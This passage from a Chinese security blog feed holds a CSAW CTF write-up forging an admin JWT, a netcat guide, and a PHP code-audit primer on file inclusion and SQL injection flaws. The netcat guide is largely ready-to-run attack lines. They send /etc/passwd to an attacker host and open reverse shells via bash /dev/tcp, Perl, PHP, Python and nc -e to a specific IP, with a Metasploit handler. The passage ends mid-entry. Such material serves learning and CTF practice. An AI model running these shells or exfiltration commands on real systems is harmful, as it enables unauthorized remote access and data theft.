class="line">http://web.chal.csaw.io:9000</span><br><span class="line">Update chal description at: 4:38 to include solve details</span><br><span class="line">Aesthetic update for chal at Sun 7:25 AM</span><br></pre></td></tr></table></figure></p><p>首先查看源码<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Welcome to our SINGLE SIGN ON PAGE WITH FULL OAUTH2.0!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/protected"</span>&gt;</span>.<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">Wish we had an automatic GET route for /authorize... well they'll just have to POST from their own clients I guess</span></span><br><span class="line"><span class="comment">POST /oauth2/token</span></span><br><span class="line"><span class="comment">POST /oauth2/authorize form-data <span class="doctag">TODO:</span> make a form for this route--!&gt;</span></span><br></pre></td></tr></table></figure></p><p>根据判断应该是基于OAuth2.0协议的身份验证,<br>不了解的童鞋可以看看这篇文章<br><a href="https://tools.ietf.org/html/rfc6749" target="_blank" rel="noopener">https://tools.ietf.org/html/rfc6749</a><br><a href="https://tools.ietf.org/html/rfc6750" target="_blank" rel="noopener">https://tools.ietf.org/html/rfc6750</a><br><a href="https://blog.csdn.net/cd_xuyue/article/details/52084220" target="_blank" rel="noopener">https://blog.csdn.net/cd_xuyue/article/details/52084220</a></p><p>首先我要获取一个<code>code</code>，用burp抓包<a href="http://web.chal.csaw.io:9000/protected" target="_blank" rel="noopener">http://web.chal.csaw.io:9000/protected</a></p><p>在<code>/oauth2/authorize</code>中<code>response_type</code>必须要填，而且为<code>code</code>，<code>redirect_uri</code>将传递给重定向端点的绝对URI</p><p><img src="https://i.loli.net/2018/09/19/5ba1e58588ed7.png" alt=""></p><p>我们将返回一个<code>code</code>,我们再次修改数据包发送<code>Access Token Request</code></p><p><img src="https://i.loli.net/2018/09/19/5ba1e65d8339e.png" alt=""></p><p><code>code</code>的参数就是刚才返回的<code>code</code>值，这样我们将得到一个<code>token</code>，这个要使用jwt解码才能看见里面的内容,</p><p>jwt解码网站<a href="https://jwt.io/" target="_blank" rel="noopener">https://jwt.io/</a></p><p><img src="https://i.loli.net/2018/09/19/5ba1e735132c5.png" alt=""></p><p>根据题目提示，我们要将<code>type</code>改成<code>admin</code>才可以</p><p>参考大佬的加密脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> OrderedDict</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump_tokens</span><span class="params">(jwt)</span>:</span></span><br><span class="line">    p1, p2, p3 = jwt.split(<span class="string">'.'</span>, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    header = decode_token(p1)</span><br><span class="line">    payload = decode_token(p2)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> header, payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode_token</span><span class="params">(token)</span>:</span></span><br><span class="line">    token_len = len(token)</span><br><span class="line">    padded_token = token.ljust(token_len + (token_len % <span class="number">4</span>), <span class="string">'='</span>)</span><br><span class="line">    dict_ = json.loads(base64.b64decode(padded_token), object_pairs_hook=OrderedDict)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> dict_</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">base64_encode</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(data).decode().strip(<span class="string">'='</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_token</span><span class="params">(dict_)</span>:</span></span><br><span class="line">    json_data = json.dumps(dict_, separators=(<span class="string">','</span>, <span class="string">':'</span>)).encode()</span><br><span class="line">    token = base64_encode(json_data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> token</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign_token</span><span class="params">(header, payload, secret)</span>:</span></span><br><span class="line">    jwt = encode_token(header) + <span class="string">'.'</span>  <span class="comment"># header</span></span><br><span class="line">    jwt += encode_token(payload) + <span class="string">'.'</span>  <span class="comment"># payload</span></span><br><span class="line">    signature = base64_encode(hmac.new(secret.encode(), jwt[:<span class="number">-1</span>].encode(), hashlib.sha256).digest())</span><br><span class="line">    signature = signature.replace(<span class="string">'/'</span>, <span class="string">'_'</span>).replace(<span class="string">'+'</span>, <span class="string">'-'</span>)</span><br><span class="line">    jwt += signature</span><br><span class="line">    <span class="keyword">return</span> jwt</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &lt; <span class="number">1</span>:</span><br><span class="line">    print(<span class="string">f'Usage <span class="subst">&#123;sys.argv[<span class="number">0</span>]&#125;</span> &lt;jwt&gt;'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    header, payload = dump_tokens(sys.argv[<span class="number">1</span>])  <span class="comment"># get original JWT as dict</span></span><br><span class="line"></span><br><span class="line">    print(<span class="string">f'''Original JWT values:</span></span><br><span class="line"><span class="string">    * header: <span class="subst">&#123;dict(header)&#125;</span></span></span><br><span class="line"><span class="string">    * payload: <span class="subst">&#123;dict(payload)&#125;</span></span></span><br><span class="line"><span class="string">'''</span>)</span><br><span class="line"></span><br><span class="line">    new_header = header</span><br><span class="line">    new_payload = payload</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Update user type</span></span><br><span class="line">    new_payload[<span class="string">'type'</span>] = <span class="string">'admin'</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Update expiration time</span></span><br><span class="line">    unix_ts = int(time.time())</span><br><span class="line">    flag_window = <span class="number">600</span></span><br><span class="line">    new_payload[<span class="string">'iat'</span>] = unix_ts</span><br><span class="line">    new_payload[<span class="string">'exp'</span>] = unix_ts + flag_window</span><br><span class="line"></span><br><span class="line">    print(<span class="string">f'''New JWT values:</span></span><br><span class="line"><span class="string">    * header: <span class="subst">&#123;dict(header)&#125;</span></span></span><br><span class="line"><span class="string">    * payload: <span class="subst">&#123;dict(payload)&#125;</span></span></span><br><span class="line"><span class="string">'''</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Generate new JWT (signature)</span></span><br><span class="line">    new_jwt = sign_token(header, payload, payload[<span class="string">'secret'</span>])</span><br><span class="line"></span><br><span class="line">    print(<span class="string">f'New signed JWT: <span class="subst">&#123;new_jwt&#125;</span>'</span>)</span><br></pre></td></tr></table></figure></p><p>运行脚本</p><p><img src="https://i.loli.net/2018/09/19/5ba1e7d01897a.png" alt=""></p><p>得到新的<code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWRtaW4iLCJzZWNyZXQiOiJ1Zm91bmRtZSEiLCJpYXQiOjE1MzczMzcyNTcsImV4cCI6MTUzNzMzNzg1N30.LVpR0h6soIt3A3IRqis-T1nywLn_D_taJQhFTZdw9SE</code></p><p>重新发送</p><p><img src="https://i.loli.net/2018/09/19/5ba1e834ab3c5.png" alt=""></p><p>flag:<code>flag{JsonWebTokensaretheeasieststorage-lessdataoptiononthemarket!theyrelyonsupersecureblockchainlevelencryptionfortheirmethods}</code></p><p><a href="https://gitlab.com/mahham/ctf/blob/master/2018-csaw/Readme.md#babycrypto-50-crypto" target="_blank" rel="noopener">https://gitlab.com/mahham/ctf/blob/master/2018-csaw/Readme.md#babycrypto-50-crypto</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;首发安全脉搏:&lt;a href=&quot;https://www.secpulse.com/archives/75785.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.secpulse.com/archives/75785.html
      
    
    </summary>
    
    
      <category term="ctf" scheme="https://threst.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>netcat食用指南</title>
    <link href="https://threst.github.io/2018/10/04/Netcat/"/>
    <id>https://threst.github.io/2018/10/04/Netcat/</id>
    <published>2018-10-04T05:34:13.000Z</published>
    <updated>2018-10-04T07:22:07.318Z</updated>
    
    <content type="html"><![CDATA[<p>阿里云ecs:47.106.230.228<br>目标机kali:校园网</p><p>可以输入nc -h查看帮助：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">-h 查看帮助信息</span><br><span class="line">-d 后台模式</span><br><span class="line">-g gateway source-routing hop point[s], up to 8</span><br><span class="line">-G num source-routing pointer: 4, 8, 12, …</span><br><span class="line">-e prog程序重定向，一但连接就执行［危险］</span><br><span class="line">-i secs延时的间隔</span><br><span class="line">-l 监听模式，用于入站连接</span><br><span class="line">-L 监听模式，连接天闭后仍然继续监听，直到CTR+C</span><br><span class="line">-n IP地址，不能用域名(不使用DNS反向查询IP地址的域名)</span><br><span class="line">-o film记录16进制的传输</span><br><span class="line">-p[空格]端口 本地端口号</span><br><span class="line">-s addr 本地源地址</span><br><span class="line">-r 随机本地及远程端口</span><br><span class="line">-t 使用Telnet交互方式</span><br><span class="line">-u UDP模式</span><br><span class="line">-v 详细输出，用-vv将更详细</span><br><span class="line">-w 数字 timeout延时间隔</span><br><span class="line">-z 将输入，输出关掉（用于扫锚时）</span><br></pre></td></tr></table></figure></p><h2 id="PortScan-端口扫描"><a href="#PortScan-端口扫描" class="headerlink" title="PortScan(端口扫描)"></a>PortScan(端口扫描)</h2><p>基本tcp扫描：<br><code>nc -vv 47.106.230.228 6666</code><br><code>例：nc -vv 47.106.230.228 6666扫描47.106.230.228 的tcp 6666端口</code></p><p>设置延时，指定端口扫描：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -vv -w secs ip port-port</span><br><span class="line">例：nc -vv -w 5 192.168.1.1 5000-5002 扫描192.168.1.1的5000-5002端口，网络超时的时间设为5秒。</span><br></pre></td></tr></table></figure></p><h2 id="聊天"><a href="#聊天" class="headerlink" title="聊天"></a>聊天</h2><p>客户端(主动)<br><code>nc ip port</code></p><p>服务端(坐等连)<br><code>nc -lvp port</code></p><h2 id="发文件"><a href="#发文件" class="headerlink" title="发文件"></a>发文件</h2><p>主要看<code>&lt;&gt;</code>符号的尖的方向，表示将文件流到其方向</p><p>发送端<br><code>nc -v -w 20 -p 6666  -l &lt; aaa.txt</code></p><p><code>-w 20</code>表示发送前后都等待20秒,根据箭头表示将文件发送到nc中</p><p>接收端<br><code>nc -v -w 2 47.106.230.228  端口 &gt;bbb.txt</code><br>由于我们是接受端，所以时间不用太久,箭头方向表示将nc接收来的文件保存起来</p><p>总的来看就是这样<br><code>aaa.txt --&gt; nc --&gt; bbb.txt</code></p><h4 id="目标机上下载文件"><a href="#目标机上下载文件" class="headerlink" title="目标机上下载文件"></a>目标机上下载文件</h4><p>攻击机<code>nc  -l -p  6666  &gt;  kali.txt</code><br>目标机<code>nc 47.106.230.228 6666  &lt;  /etc/passwd</code><br>这样就将本地kali的文件发给攻击者了</p><h4 id="上传文件至目标机"><a href="#上传文件至目标机" class="headerlink" title="上传文件至目标机"></a>上传文件至目标机</h4><p>攻击机<code>nc  -l -p  6666  &lt; /etc/passwd</code><br>目标机<code>nc 47.106.230.228 6666  &gt;  ecs.txt</code><br>将攻击机中passwd下载至本地ecs.txt,关于<code>&lt;&gt;</code>的用法和上面介绍的一样</p><h4 id="加密传输的数据"><a href="#加密传输的数据" class="headerlink" title="加密传输的数据"></a>加密传输的数据</h4><p>服务端：$nc localhost 1567 | mcrypt –flush –bare -F -q -d -m ecb &gt; file.txt<br>客户端：$mcrypt –flush –bare -F -q -m ecb &lt; file.txt | nc -l 1567</p><h4 id="命令记录"><a href="#命令记录" class="headerlink" title="命令记录"></a>命令记录</h4><p><code>nc -vv victim_ip port &lt; path\file.cmd</code></p><h4 id="搭建蜜罐"><a href="#搭建蜜罐" class="headerlink" title="搭建蜜罐"></a>搭建蜜罐</h4><ul><li><code>nc -L -p 80</code> 作为蜜罐用1：开启并不停地监听80端口，直到CTR+C为止</li><li><code>nc -L -p 80 &gt; c:\log.txt</code>作为蜜罐用2：开启并不停地监听80端口，直到CTR+C,同时把结果输出到c:\log.txt<br>*<code>nc -L -p 80 &lt; c:\honeyport.txt</code>作为蜜罐用3-1：开启并不停地监听80端口，直到CTR+C,并把c:\honeyport.txt中内容送入管道中，亦可起到传送文件作用</li><li><code>type.exe c:\honeyport | nc -L -p 80</code>作为蜜罐用3-2：开启并不停地监听80端口，直到CTR+C,并把c:\honeyport.txt中内容送入管道中,亦可起到传送文件作用</li></ul><p>作为蜜罐使用1：</p><p>命令：<code>nc -L -p  Port</code></p><p>注：使用“-L”参数可以不停的监听某一个端口，知道Ctrl+C为止</p><p>作为蜜罐使用2：</p><p>命令：<code>nc -L -p  Port &gt;log.txt</code></p><p>注：使用<code>“-L”</code>参数可以不停的监听某一个端口，知道Ctrl+C为止，同时把结果输出到log.txt文件中，如果把<code>“&gt;”</code>改为<code>“&gt;&gt;”</code>即追加到文件之后。</p><p>这一个命令参数<code>“-L”</code>在Windows中有，现在的Linux中是没有这个选项的，但是自己可以去找找，这里只是想到了之前的这个使用，所以提出来简单介绍一下！</p><h2 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h2><h3 id="正向shell-没有公网ip的主机发起对目标主机的远程连接"><a href="#正向shell-没有公网ip的主机发起对目标主机的远程连接" class="headerlink" title="正向shell(没有公网ip的主机发起对目标主机的远程连接)"></a>正向shell(没有公网ip的主机发起对目标主机的远程连接)</h3><p>公网服务器:47.106.230.228<br>校园网kali</p><p>服务器<br><code>nc -lvp 6666 -t -e /bin/bash</code></p><p>目标主机(可以执行命令)<br><code>nc 47.106.230.228 6666</code></p><h3 id="反向shell"><a href="#反向shell" class="headerlink" title="反向shell"></a>反向shell</h3><p><img src="https://i.loli.net/2018/10/01/5bb1cebd65fee.jpg" alt="Netcat-reverse-shell.jpg"></p><p><code>–e</code>选项发送回一个BashShell的攻击。请注意，我们还可以使用cmd.exe的<code>–e</code>选项的窗口</p><p>netcat监听者<code>nc -lvp 6666</code><br>目标主机<code>nc 47.106.230.228 6666 -e /bin/bash</code><br>对于Windows：<br><code>nc 47.106.230.228 6666 -e cmd.exe</code></p><h4 id="目标主机中没有nc"><a href="#目标主机中没有nc" class="headerlink" title="目标主机中没有nc"></a>目标主机中没有nc</h4><p>上面的情况是目标主机中有nc，如果没有怎么办呢?<br>攻击照常监听<code>nc -lvp 6666</code><br>目标主机<code>bash -i&gt;&amp; /dev/tcp/47.106.230.228/6666 0&gt;&amp;1</code></p><p><img src="https://i.loli.net/2018/10/01/5bb1d32d6f137.jpg" alt="Netcat-basics-Reverse-shell-bash-6.jpg"></p><p>注意空格</p><h5 id="使用Perl"><a href="#使用Perl" class="headerlink" title="使用Perl"></a>使用Perl</h5><p>攻击照常监听<code>nc -lvp 6666</code></p><p>目标主机<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">'use Socket;$i="47.106.230.228";$p=6666;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span></span><br></pre></td></tr></table></figure></p><h5 id="PHP-shell"><a href="#PHP-shell" class="headerlink" title="PHP shell"></a>PHP shell</h5><p>攻击照常监听<code>nc -lvp 6666</code></p><p>目标主机<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">'$sock=fsockopen("47.106.230.228",6666);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span><br></pre></td></tr></table></figure></p><h5 id="Python-shell"><a href="#Python-shell" class="headerlink" title="Python shell"></a>Python shell</h5><p>攻击照常监听<code>nc -lvp 6666</code></p><p>目标主机<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("47.106.230.228",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></span><br></pre></td></tr></table></figure></p><p><a href="https://www.hackingtutorials.org/networking/hacking-with-netcat-part-3-advanced-techniques/" target="_blank" rel="noopener">流量转发</a></p><h2 id="从nc升级到msf"><a href="#从nc升级到msf" class="headerlink" title="从nc升级到msf"></a>从nc升级到msf</h2><h3 id="简单"><a href="#简单" class="headerlink" title="简单"></a>简单</h3><p>攻击机<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload linux/x64/shell/reverse_tcp</span><br><span class="line">set lhost 47.106.230.228(ecs本机ip)</span><br><span class="line">set lport 6666</span><br></pre></td></tr></table></figure></p><p>目标主机<br><code>nc 47.106.230.228 6666 -e /bin/bash</code></p><p><img src="https://i.loli.net/2018/10/01/5bb1d84d6abd4.png" alt=""></p><p>成功获取回话</p><h2 id="资料"><a href="#资料" class="headerlink" title="资料:"></a>资料:</h2><p><a href="https://www.anquanke.com/post/id/87017" target="_blank" rel="noopener">https://www.anquanke.com/post/id/87017</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;阿里云ecs:47.106.230.228&lt;br&gt;目标机kali:校园网&lt;/p&gt;
&lt;p&gt;可以输入nc -h查看帮助：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span cl
      
    
    </summary>
    
    
      <category term="netcat" scheme="https://threst.github.io/tags/netcat/"/>
    
  </entry>
  
  <entry>
    <title>php安全</title>
    <link href="https://threst.github.io/2018/10/04/php%E5%AE%89%E5%85%A8/"/>
    <id>https://threst.github.io/2018/10/04/php安全/</id>
    <published>2018-10-04T05:34:12.000Z</published>
    <updated>2018-10-04T07:21:47.693Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-PHP敏感配置项"><a href="#0x01-PHP敏感配置项" class="headerlink" title="0x01 PHP敏感配置项"></a>0x01 PHP敏感配置项</h1><h2 id="register-globals-php版本小于5-4时存在"><a href="#register-globals-php版本小于5-4时存在" class="headerlink" title="register_globals(php版本小于5.4时存在)"></a>register_globals(php版本小于5.4时存在)</h2><p>当该配置项为ON时，会把用户通过GET、POST提交的参数自动注册成全局变量。当代码中存在有未初始化的变量时，可能会导致变量覆盖的问题；</p><p>(PS:其中参数覆盖的顺序受到配置文件中variables_order的参数影响，默认是EGPCS。按顺序，右边的参数来源会覆盖左边的的参数来源)</p><h2 id="allow-url-include-php版本大于5-2默认为off"><a href="#allow-url-include-php版本大于5-2默认为off" class="headerlink" title="allow_url_include(php版本大于5.2默认为off)"></a>allow_url_include(php版本大于5.2默认为off)</h2><p>当该配置项为ON时，可以通过include、require等函数进行远程文件包含</p><p>其中有个类似的配置项是allow_url_fopen，这个参数配置为on的时候可以函数中例如file_get_contents中打开url。</p><p>当两个配置项都为ON的时候，可以直接使用url进行远程包含，当include为ON，fopen为OFF时，只能通过php伪协议进行包含</p><h2 id="magic-quato-gpc（php版本小于5-4存在）"><a href="#magic-quato-gpc（php版本小于5-4存在）" class="headerlink" title="magic_quato_gpc（php版本小于5.4存在）"></a>magic_quato_gpc（php版本小于5.4存在）</h2><p>此配置项为ON的时候会对GET、POST、COOKIE变量中的单引号(‘)、双引号(“)、反斜杠（）、空字符(NULL)前添加反斜杠进行转义，注意：这个配置并不会对SERVER变量里的特殊字符进行转义，因此可能会导致referer、client-ip存在注入等漏洞</p><h2 id="magic-quato-runtime（php版本小于5-4存在）"><a href="#magic-quato-runtime（php版本小于5-4存在）" class="headerlink" title="magic_quato_runtime（php版本小于5.4存在）"></a>magic_quato_runtime（php版本小于5.4存在）</h2><p>这个配置和magic_quato_gpc的区别就在于runtime是对从数据库或者文件中取出的数据进行转义，因此只对例如file()、fgets()、fread（）、mysql_fetch_array（）等很多对数据库查询和文件读取的函数产生影响</p><h2 id="magic-quato-sybase（php版本小于5-4存在）"><a href="#magic-quato-sybase（php版本小于5-4存在）" class="headerlink" title="magic_quato_sybase（php版本小于5.4存在）"></a>magic_quato_sybase（php版本小于5.4存在）</h2><p>这个配置和magic_quato_gpc 的区别在于，sybase只会转义空字符，把单引号转为双引号，并且这个配置如果为ON会覆盖gpc的配置</p><h2 id="open-basedir"><a href="#open-basedir" class="headerlink" title="open_basedir"></a>open_basedir</h2><p>这个配置用来设置限定php程序只能访问哪些目录。在windows下，多个目录用分号（;）分割，linux下用冒号(:)进行分割。注意的是配置的目录需要用斜杠（/）进行封尾，否则就变成了前缀匹配。例如，配置/var/test，那么/var/test和/var/test123都是可以进行访问的，如果指定一个确定的目录就要写成/var/test/</p><h1 id="0x02-PHP常见敏感函数"><a href="#0x02-PHP常见敏感函数" class="headerlink" title="0x02 PHP常见敏感函数"></a>0x02 PHP常见敏感函数</h1><pre><code>注入: select from,mysql_connect,mysql_query,mysql_fetch_*,update,insert,delete宽字节注入: set names gbk、character_set_client=gbk mysql_set_charset(&apos;gbk&apos;),iconv二次编码注入: urldecode,rawurldecode文件包含 : include,include_once 、require、require_once文件上传 : move_upload_file任意文件删除 : unlink、session_destory代码注入 : eval assert,preg_replace(/e),call_user_func,call_user_func_array,array_map等命令执行: system、exec、shell_exec、passthru 、pctnl_exec、popen、proc_exec、变量覆盖: extract、parse_str、$$反序列化: unserialize随机数: rand、mt_rand</code></pre><h1 id="0x03-常见漏洞解析"><a href="#0x03-常见漏洞解析" class="headerlink" title="0x03 常见漏洞解析"></a>0x03 常见漏洞解析</h1><h2 id="各种问题可以导致系统重装"><a href="#各种问题可以导致系统重装" class="headerlink" title="各种问题可以导致系统重装"></a>各种问题可以导致系统重装</h2><p>一般程序都是通过判断install文件下有没有安装过程中生成的以lock为后缀的文件或者config配置文件来判断有没有安装。</p><h3 id="1-未对系统是否已经安装进行判断"><a href="#1-未对系统是否已经安装进行判断" class="headerlink" title="1.未对系统是否已经安装进行判断"></a>1.未对系统是否已经安装进行判断</h3><p>例如PHPSHE B2C商城1.6（wooyun 2014-062047）<br>可以看到代码未对是否安装进行任何判断，直接进入安装流程</p><h3 id="2-变量覆盖绕过"><a href="#2-变量覆盖绕过" class="headerlink" title="2.变量覆盖绕过"></a>2.变量覆盖绕过</h3><p>例如frcms (wooyun 2014-073244)<br>其中主要的漏洞代码是</p><pre><code>foreach(Array(&apos;_GET&apos;,&apos;_POST&apos;,&apos;_COOKIE&apos;) as $_request){    foreach($$_request as $_k =&gt; $_v) ${$_k} = _runmagicquotes($_v);}</code></pre><p>他会把你从GET、POST、COOKIE中的变量注册为全局变量，因此我们直接通过GET参数提交$insLockfile变量即可绕过</p><h3 id="3-判断已安装后未exit-退出程序"><a href="#3-判断已安装后未exit-退出程序" class="headerlink" title="3.判断已安装后未exit()退出程序"></a>3.判断已安装后未exit()退出程序</h3><p>例如startbbs （wooyun-2013-045143）</p><pre><code>class Install extends Install_Controller{function __construct (){    parent::__construct();    $this-&gt;load-&gt;library(&apos;myclass&apos;);    $file=FCPATH.&apos;install.lock&apos;;    if (file_exists($file)){        $this-&gt;myclass-&gt;notice(&apos;alert(&quot;系统已安装过&quot;);window.location.href=&quot;&apos;.site_url().&apos;&quot;;&apos;);    }}</code></pre><p>可以看到其中判断install.lock文件存在后直接使用js代码将用户进行重定向，但是并没有die程序，直接从前端删除返回的js代码即可重装</p><h3 id="4-还可以借助任意文件删除的漏洞来删除lock文件，然后进行重装（PS-这个就留在任意文件删除再分析）"><a href="#4-还可以借助任意文件删除的漏洞来删除lock文件，然后进行重装（PS-这个就留在任意文件删除再分析）" class="headerlink" title="4.还可以借助任意文件删除的漏洞来删除lock文件，然后进行重装（PS:这个就留在任意文件删除再分析）"></a>4.还可以借助任意文件删除的漏洞来删除lock文件，然后进行重装（PS:这个就留在任意文件删除再分析）</h3><p>例如: 用thinkphp 改造的hdcms （wooyun-2015-092061）<br>我们先跟着框架走一遍，首先查看入口文件index.php</p><p>首先定义了一些基本的框架目录，然后就直接开始引入框架文件，我们进入框架初始化文件hdphp.php</p><p>前面还是检测一次是否成功初始化常量，然后检测是否进行过编译，否则就载入文件进行首次编译，然后进行boot的run方法，查看该方法内容。</p><p>前面依然是定义了各种常量，我们可以直接跳过，来到最后的应用初始化，查看该方法</p><p>可以看到module_path常量是通过将get形式提交的var_group参数进行拼接的，然后又将module_path拼接入module_config_path，最后使用require进行了文件包含。（PS:因为这里后面制定了config.php，所以需要用到%00进行截断）</p><p>但是我们分析到目前为止只能说是疑似存在文件包含漏洞，我们还要看GET参数接收时有没有进行过滤，于是我们进入之前的解析路由方法route::parseurl()，代码较长我就不贴图了，里面就是将url中的参数进行截取解析，没有进行任何的过滤和检测，因此可以确定此处存在文件包含漏洞。因此我们接下来需要确定输入点，可以发现变量是通过thinkphp中获取参数的C方法进行获取的，而C方法获取的变量在config.php中，于是我们查看文件中可以看到var_group对应的变量是g</p><p>因此我们可以先上传一个文件然后index.php?g=../test.php%00</p><p>之前的文件包含漏洞我们是通过index.php这个入口文件一步步搞懂cms框架然后进行审计。除了这种方法，我们还可以直接定位数据库查询语句或者功能附近，看看传入的数据有没有被进行清洗。</p><p>注入漏洞这里我们就用两个有意思的骚操作来分析一下</p><h4 id="1-Ecshop-支付宝插件全局转义绕过导致sql注入"><a href="#1-Ecshop-支付宝插件全局转义绕过导致sql注入" class="headerlink" title="1.Ecshop 支付宝插件全局转义绕过导致sql注入"></a>1.Ecshop 支付宝插件全局转义绕过导致sql注入</h4><p>其实在ECshop中的init.php中对用户输入的参数进行了全局转义</p><p>但是我们来到来到案发现场看看，巧妙的运用str_replace的替换功能来帮助单引号进行逃逸</p><p>其中的核心漏洞代码是$order_sn = str_replace($_GET[‘subject’], ‘’, $_GET[‘out_trade_no’]);其中代码对用户提交的out_trade_no参数中将subject替换为空，然后送入check_money函数中的sql查询语句.<br>这个漏洞的关键在于str_replace函数中的替换内容和源字符串都是可控的。<br>理解这个漏洞之前我们再来回顾一下php中addslashes中的转义处理机制[--&gt;\,”–&gt;\”,”–&gt;\”,null–&gt;\0]<br>于是我们可以提交out_trade_no参数为%00’后面再跟上我们的payload，提交的subject参数为0，我们来看一下数据转换过程.<br>out_trade_no=%00’ ————&gt;经过全局gpc转义————&gt; out_trade_no=\0\’————&gt;送入str_replace函数处理，将0替换————&gt;out_trade_no=\‘ 也就是等于了’，最终也就成功在sql语句中引入了一个单引号，从而可以进行注入</p><h4 